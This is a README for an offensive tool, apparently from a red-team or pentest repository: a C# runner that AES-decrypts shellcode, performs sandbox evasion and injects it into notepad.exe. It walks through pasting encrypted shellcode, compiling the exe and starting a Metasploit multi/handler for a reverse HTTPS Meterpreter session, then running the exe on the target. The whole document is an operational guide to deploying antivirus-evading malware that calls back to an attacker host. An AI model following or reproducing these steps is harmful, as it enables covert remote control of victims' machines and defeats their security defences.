# AES Shellcode Runner with AV Evasion

## Files

| File | Purpose |
|---|---|
| `aes-shellcode-av-evasion.cs` | C# runner — AES decrypt, sandbox evasion checks, inject via VirtualAllocExNuma + CreateRemoteThread |

## Usage

**1. Encrypt your shellcode** using `../aes-shellcode-encryption/` and copy the output `buf`.

**2. Paste the encrypted buf into `aes-shellcode-av-evasion.cs`:**
```csharp
byte[] buf = new byte[896] {
    // ← paste your full encrypted buf here
};
```

**3. (Optional) Change the target process** — default is `notepad.exe`:
```csharp
Process targetProcess = Process.Start("notepad.exe");  // ← change if needed
```

**4. Compile:**

**Visual Studio:**
1. Create a new project → Console App (.NET Framework)
2. Replace `Program.cs` with the contents of `aes-shellcode-av-evasion.cs`
3. Set configuration to **Release** and platform to **x64**
4. Build → Build Solution (`Ctrl+Shift+B`)
5. Exe is in `bin\x64\Release\`

**Command line:**
```powershell
csc /target:exe /platform:x64 /optimize+ /out:Runner.exe aes-shellcode-av-evasion.cs
```

**5. Start your listener:**
```bash
msfconsole -q -x "
    use multi/handler;
    set payload windows/x64/meterpreter/reverse_https;
    set LHOST <IP>;
    set LPORT 443;
    run"
```

**6. Run the exe on the target.**

> Note: the runner sleeps for 5 seconds before injecting — this is expected.
